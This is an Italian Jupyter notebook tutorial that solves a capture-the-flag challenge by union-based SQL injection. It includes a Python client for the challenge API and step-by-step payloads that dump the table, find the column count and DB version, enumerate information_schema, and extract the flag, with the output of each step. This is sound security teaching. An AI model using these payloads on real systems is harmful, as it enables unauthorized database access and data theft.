# Union SQL injection

Manipolare le espressioni logiche è carino ma rubare informazioni è anche meglio. Qui imparerai alcune tecniche per estrarre informazioni da un database usando le SQL injection.

Come nel capitolo dedicato alle injection logiche, la prima cosa da provare è inviare qualche input per verificare quale query sta venendo eseguita e in quale posizione avviene l'injection.

In [2]:
import requests

class Inj:
    def __init__(self, host):
        self.sess = requests.Session()
        self.base_url = "{}/api/".format(host)
        self._refresh_csrf_token()

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + "get_token").json()
        self.token = resp["token"]

    def _do_raw_req(self, url, query):
        headers = {"X-CSRFToken": self.token}
        data = {"query": query}
        return self.sess.post(url, json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + "logic"
        return self._do_raw_req(url, query)

    def union(self, query):
        url = self.base_url + "union"
        return self._do_raw_req(url, query)

    def blind(self, query):
        url = self.base_url + "blind"
        return self._do_raw_req(url, query)

    def time(self, query):
        url = self.base_url + "time"
        return self._do_raw_req(url, query)

# Inizializziamo l'oggetto con l'URL della challenge
target_url = "http://web-17.challs.olicyber.it"
injector = Inj(target_url)
print("Classe inizializzata con successo!")

Classe inizializzata con successo!


In [3]:
def print_report(payload, response):
    """Funzione di utilità per stampare i risultati dell'API in modo leggibile."""
    print("="*60)
    print(f"[*] INPUT INVIATO:  {payload}")
    print(f"[*] QUERY ESEGUITA: {response.get('query', 'N/D')}")
    print(f"[*] RISULTATO:      {response.get('result', 'N/D')}")
    
    if response.get('sql_error'):
        print("\n[!] ERRORE SQL RILEVATO:")
        print(response['sql_error'])
    print("="*60 + "\n")

## 1. Indagine Iniziale
Come puoi osservare, il server sta eseguendo:
`SELECT * FROM dummy_data WHERE id='*il tuo input*'`

Siccome la query sta confrontando il tuo input con un id, possiamo ipotizzare che questo sia un intero. Prova a inviarne uno e osserva il risultato.

In [4]:
payload_1 = "1"
response_1 = injector.union(payload_1)
print_report(payload_1, response_1)

[*] INPUT INVIATO:  1
[*] QUERY ESEGUITA: SELECT * FROM dummy_data WHERE id='1'
[*] RISULTATO:      1, dummy value1, 3, another_value1, lollo, 4



## 2. Injection Logica per rivelare l'intera tabella
L'input 1 restituisce il risultato:
`1, dummy value1, 3, another_value1, lollo, 4`

Ogni parola proviene da una colonna della tabella `dummy_data`. Puoi provare un'injection logica per rivelare l'intero contenuto della tabella, per scoprire se vi è contenuta qualche informazione interessante (spoiler: no).
Dov'è la flag? Per ora non lo sappiamo, ma possiamo scoprirlo insieme.

In [5]:
payload_2 = "1' or 1=1 -- -"
response_2 = injector.union(payload_2)
print_report(payload_2, response_2)

[*] INPUT INVIATO:  1' or 1=1 -- -
[*] QUERY ESEGUITA: SELECT * FROM dummy_data WHERE id='1' or 1=1 -- -'
[*] RISULTATO:      4, pls stop, 0, example, lollo, 17
3, i'm fake, 8, data, ignoreme, 21
2, Some data, 3, pinki panko, sgrullo, 34
1, dummy value1, 3, another_value1, lollo, 4



## 3. Calcolare il numero di colonne con UNION
Come facciamo ad ottenere altre informazioni dalla nostra query? Possiamo utilizzare la parola chiave `UNION`.
La parola chiave UNION permette di combinare il risultato di più espressioni SELECT in un unico set di risultati. In altre parole ci permette di eseguire una seconda query SELECT, e aggiungere i suoi risultati a quelli visualizzati per la prima. In questo modo possiamo interrogare altre tabelle oltre a quella originariamente soggetta alla query.

C'è però una regola da rispettare: le due espressioni SELECT (quella originale e quella che scriveremo noi) devono restituire risultati con lo stesso numero di colonne. In questo caso la prima SELECT restituisce sei colonne, perciò anche noi dovremo iniettarne una da sei. Prova ad inviare il payload seguente e osserva i risultati.
`1' union select 1,2,3,4,5,6 -- -`

In [ ]:
payload_3 = "1' UNION SELECT 1,2,3,4,5,6 -- -"
response_3 = injector.union(payload_3)
print_report(payload_3, response_3)

[*] INPUT INVIATO:  1' union select 1,2,3,4,5,6 -- -
[*] QUERY ESEGUITA: SELECT * FROM dummy_data WHERE id='1' union select 1,2,3,4,5,6 -- -'
[*] RISULTATO:      1, 2, 3, 4, 5, 6
1, dummy value1, 3, another_value1, lollo, 4



## 4. Estrarre la versione del Database
Ora che possiamo ottenere l'output di espressioni SELECT arbitrarie, siamo pronti ad ottenere qualche informazione in più. Una buona cosa da cui cominciare è la versione del database. Database diversi hanno modi diversi di ottenere le informazioni di versione, ma siccome non sappiamo quale stia venendo usato dal backend, possiamo provarli tutti finché non otteniamo una risposta positiva.

Aggiungi la parola chiave UNION all'inizio dell'espressione precedente ed adattala al numero di colonne atteso dalla query che stiamo attaccando, e otterrai l'informazione desiderata!

In [ ]:
payload_4 = "1' UNION SELECT 1,version(),3,4,5,6 -- -"
response_4 = injector.union(payload_4)
print_report(payload_4, response_4)

[*] INPUT INVIATO:  1' union select 1,version(),3,4,5,6 -- -
[*] QUERY ESEGUITA: SELECT * FROM dummy_data WHERE id='1' union select 1,version(),3,4,5,6 -- -'
[*] RISULTATO:      1, 9.5.0, 3, 4, 5, 6
1, dummy value1, 3, another_value1, lollo, 4



## 5. Indagare l'Information Schema
Finalmente, è tempo di ottenere la flag, ma dove si trova? Per scoprirlo dobbiamo conoscere le tabelle presenti all'interno del database.
MySQL fornisce uno schema (collezione di tabelle) contenente metadati utile alla nostra causa chiamato `information_schema`.
Due delle tabelle di questo schema rivelano informazioni che ci interessano:
- La tabella `tables` contiene una lista di tutte le tabelle accessibili.
- La tabella `columns` contiene una lista di tutte le colonne di tutte le tabelle accessibili.

Cerchiamo le colonne e le tabelle interrogando lo schema di sistema:

In [ ]:
payload_5 = "1' UNION SELECT 1,table_name,column_name,4,5,6 FROM information_schema.columns WHERE table_schema=DATABASE() -- -"
response_5 = injector.union(payload_5)
print_report(payload_5, response_5)

[*] INPUT INVIATO:  1' union select 1,table_name,column_name,4,5,6 from information_schema.columns where table_schema=DATABASE() -- -
[*] QUERY ESEGUITA: SELECT * FROM dummy_data WHERE id='1' union select 1,table_name,column_name,4,5,6 from information_schema.columns where table_schema=DATABASE() -- -'
[*] RISULTATO:      1, real_data, flag, 4, 5, 6
1, real_data, id, 4, 5, 6
1, dummy_data, idk_what_im_doing, 4, 5, 6
1, dummy_data, foobar, 4, 5, 6
1, dummy_data, another_column, 4, 5, 6
1, dummy_data, dummy_int, 4, 5, 6
1, dummy_data, dummy_column, 4, 5, 6
1, dummy_data, id, 4, 5, 6
1, dummy value1, 3, another_value1, lollo, 4



## 6. Estrarre la Flag finale
Dall'output precedente, scopriamo l'esistenza di una tabella chiamata `real_data` che contiene una colonna interessante chiamata `flag`.
Non ci resta che utilizzare un'ultima volta l'operatore UNION per leggere il contenuto di quella colonna dalla tabella.

In [ ]:
payload_6 = "1' UNION SELECT 1,id,flag,4,5,6 FROM real_data -- -"
response_6 = injector.union(payload_6)
print_report(payload_6, response_6)

[*] INPUT INVIATO:  1' union select 1,id,flag,4,5,6 from real_data -- -
[*] QUERY ESEGUITA: SELECT * FROM dummy_data WHERE id='1' union select 1,id,flag,4,5,6 from real_data -- -'
[*] RISULTATO:      1, 1, flag{Uni0ns_4re_so_tr1vi4l}, 4, 5, 6
1, dummy value1, 3, another_value1, lollo, 4



In [ ]:
payload_7 = "1' UNION SELECT 1,GROUP_CONCAT(CONCAT(TABLE_NAME, ' - ', COLUMN_NAME)),3,4,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE() -- -"
response_7 = injector.union(payload_7)
print_report(payload_7, response_7)

[*] INPUT INVIATO:  -1' UNION SELECT 1,GROUP_CONCAT(CONCAT(TABLE_NAME, ' - ', COLUMN_NAME)),3,4,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE() -- -
[*] QUERY ESEGUITA: SELECT * FROM dummy_data WHERE id='-1' UNION SELECT 1,GROUP_CONCAT(CONCAT(TABLE_NAME, ' - ', COLUMN_NAME)),3,4,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE() -- -'
[*] RISULTATO:      1, dummy_data - id,dummy_data - dummy_column,dummy_data - dummy_int,dummy_data - another_column,dummy_data - foobar,dummy_data - idk_what_im_doing,real_data - id,real_data - flag, 3, 4, 5, 6

